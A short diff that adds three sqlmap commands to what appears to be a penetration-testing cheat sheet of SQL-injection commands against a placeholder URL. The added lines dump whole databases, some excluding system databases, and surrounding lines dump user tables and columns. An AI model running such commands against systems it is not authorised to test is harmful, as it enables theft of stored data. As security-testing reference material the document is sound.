@@ -666,6 +666,9 @@ $ sqlmap -u <URL> -v 3 --level=5
 $ sqlmap -u <URL> --level=5 --risk=3
 $ sqlmap -u <URL> --banner --current-user --current-db --is-dba
 $ sqlmap -u <URL> --tables -D testdb
+$ sqlmap -u <URL> --dump-all
+$ sqlmap -u <URL> --dump-all --exclude-sysdbs
+$ sqlmap -u <URL> --dump -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
 $ sqlmap -u <URL> --dump -T users -D testdb --start=2 --stop=3
